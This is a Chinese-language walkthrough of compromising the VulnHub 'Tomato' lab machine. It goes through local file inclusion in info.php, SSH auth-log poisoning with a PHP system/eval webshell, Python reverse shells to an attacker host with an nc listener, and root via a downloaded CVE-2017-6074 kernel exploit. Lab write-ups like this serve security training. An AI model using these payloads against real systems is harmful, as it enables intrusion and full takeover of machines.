靶场搭建

靶机镜像下载地址：

http://www.vulnhub.com/entry/tomato-1,557/

用 VMware 直接打开下载好的 .ova 镜像即可导入


Kali Linux IP：192.168.123.5



信息收集

起初不知道靶机的 IP，先探测一波

nmap 192.168.123.0/24

再扫一下端口，免得扫漏了

得知开启了 21、80、2211、8888 端口

先访问80端口

看不出有什么好东西

然后访问一下 8888 端口


弹出登录框要求登录，试了一下弱口令，理所当然没那么简单，目前不知道账号密码，先放着


使用 dirb 爆破目录

dirb http://192.168.123.18


根据爆破目录结果，访问

http://192.168.123.18/antibot_image/

一顿乱点，通过查看 /antibot_image/antibots/info.php 的源代码，发现存在文件包含 GET 型传递参数为 image




漏洞利用

测试使用文件包含读取 /etc/passwd

http://192.168.123.18/antibot_image/antibots/info.php?image=/../etc/passwd


因为得知靶机开了ssh服务，所以可以考虑尝试通过包含 ssh 认证日志文件，路径为 /var/log/auth.log

ssh root@192.168.123.18 -p 2211

测试一下


访问

http://192.168.123.18/antibot_image/antibots/info.php?image=/../var/log/auth.log

发现是可行的，这样就可以利用 <?php system($_GET['cmd']);?> 作为用户名进行注入

ssh '<?php system($_GET['cmd']);?>'@192.168.123.18 -p 2211

执行一个命令查看注入结果

http://192.168.123.18/antibot_image/antibots/info.php?image=/../var/log/auth.log&cmd=whoami

直接写马

ssh '<?php @eval($_POST['123456']);?>'@192.168.123.18 -p 2211

使用webshell工具连接

或者可以用 python 实现反弹 shell

python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('VPS_IP',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

攻击机监听 8888 端口

nc -lvp 8888

访问

http://192.168.123.18/antibot_image/antibots/info.php?image=/../var/log/auth.log&cmd= python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.123.5",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


反弹成功

将 shell 变为交互式的 shell

python3 -c 'import pty;pty.spawn("/bin/bash")'




提权

信息收集一波，其中

uname -a 查看一下系统内核

Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

然后寻找一下 4.4.0-21-generic 可以利用的 exp

https://github.com/kkamagui/linux-kernel-exploits


在kali下，编译.c文件，然后在此目录下启用http服务

python2 -m SimpleHTTPServer 9999


接着远程

wget http://192.168.123.5:9999/CVE-2017-6074

下载 exp

然后给 exp 赋予执行权限

chmod +x CVE-2017-6074

最后运行 exp，成功拿到 root 权限
